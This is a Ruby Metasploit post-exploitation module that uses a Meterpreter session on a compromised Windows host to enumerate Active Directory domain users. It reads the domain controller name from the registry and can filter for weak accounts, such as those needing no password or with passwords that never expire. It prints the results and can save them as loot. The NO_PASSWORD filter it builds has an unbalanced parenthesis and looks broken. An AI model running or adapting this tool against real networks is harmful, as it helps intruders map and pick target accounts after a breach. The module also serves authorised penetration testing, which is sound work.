# encoding: UTF-8

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::ExtAPI

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Windows Gather AD Enumerate Domain User Accounts',
                      'Description'   => %q{ This Module will perform an ADSI query and enumerate
                        domain users and can filter depending on User Account Control Parameters
                        on the domain the host is a member of through a Windows Meterpreter
                        Session.},
                      'License'       => BSD_LICENSE,
                      'Author'        => 'Carlos Perez <carlos_perez[at]darkoperator.com>',
                      'Platform'      => 'win',
                      'SessionTypes'  => 'meterpreter'
      ))
    register_options(
      [
        OptString.new('DOMAIN_DN', [false, 'DN of the domain to enumerate.', nil]),
        OptBool.new('EXCLUDE_LOCKED', [true, 'Exclude in search locked accounts..', false]),
        OptBool.new('EXCLUDE_DISABLED', [true, 'Exclude from search disabled accounts.', false]),
        OptBool.new('STORE_LOOT', [true, 'Store file in loot.', false]),
        OptEnum.new('UAC', [true,
                            'Filter on User Account Control Setting.',
                            'ANY', [
                                      'ANY',
                                      'NO_PASSWORD',
                                      'CHANGE_PASSWORD',
                                      'NEVER_EXPIRES',
                                      'SMARTCARD_REQUIRED',
                                      'NEVER_LOGGEDON']]),
        OptInt.new('MAX_SEARCH', [false, 'Maximum values to retrieve, 0 for all.', 100])
      ], self.class)
  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")

    # Make sure the extension is loaded.
    if load_extapi
      domain = get_domain
      unless domain.nil?

        unless datastore['DOMAIN_DN'].nil?
          domain = datastore['DOMAIN_DN']
        end

        table = Rex::Ui::Text::Table.new(
          'Indent' => 4,
          'SortIndex' => -1,
          'Width' => 80,
          'Columns' =>
          [
            'SAMAccount',
            'Email',
            'Comment',
            'Primary Group ID',
            'Distinguished Name'
          ]
        )
        inner_filter = '(sAMAccountType=805306368)'

        if datastore['EXCLUDE_LOCKED']
          inner_filter = "#{inner_filter}(!(lockoutTime>=1))"
        end

        if datastore['EXCLUDE_DISABLED']
          inner_filter = "#{inner_filter}(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
        end

        case datastore['UAC']

        when 'ANY'
          inner_filter = "#{inner_filter}"

        when 'NO_PASSWORD'
          inner_filter = "#{inner_filter}((userAccountControl:1.2.840.113556.1.4.803:=32)"

        when 'CHANGE_PASSWORD'
          inner_filter = "#{inner_filter}(!sAMAccountType=805306370)(pwdlastset=0)"

        when 'NEVER_EXPIRES'
          inner_filter = "#{inner_filter}(userAccountControl:1.2.840.113556.1.4.803:=65536)"

        when 'SMARTCARD_REQUIRED'
          inner_filter = "#{inner_filter}(userAccountControl:1.2.840.113556.1.4.803:=262144)"

        when 'NEVER_LOGGEDON'
          inner_filter = "#{inner_filter}(|(lastlogon=0)(!lastlogon=*))"
        end

        filter =   "(&#{inner_filter})"
        query_result = session.extapi.adsi.domain_query(domain,
                                                        filter,
                                                        datastore['MAX_SEARCH'],
                                                        datastore['MAX_SEARCH'],
                                                        ['samaccountname',
                                                         'mail',
                                                         'comment',
                                                         'primarygroupid',
                                                         'distinguishedname']
                                                      )
        if query_result[:results].empty?
          print_status 'No results where found.'
          return
        end

        query_result[:results].each do |obj|
          table << [obj[0][:value], obj[1][:value], obj[2][:value], obj[3][:value], obj[4][:value]]
        end
        table.print
        print_line

        if datastore['STORE_LOOT']
          stored_path = store_loot('ad.users', 'text/plain', session, table.to_csv)
          print_status("Results saved to: #{stored_path}")
        end
      end
    end
  end

  def get_domain
    domain = nil
    begin
      subkey = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History'
      v_name = 'DCName'
      key_vals = registry_enumvals(subkey)
      if key_vals.include?(v_name)
        domain_dc = registry_getvaldata(subkey, v_name)
        # lets parse the information
        dom_info =  domain_dc.split('.')
        domain = dom_info[1].upcase
      else
        print_status 'Host is not part of a domain.'
      end
    rescue
      print_error('Could not determine if the host is part of a domain.')
      return nil
    end
    domain
  end
end
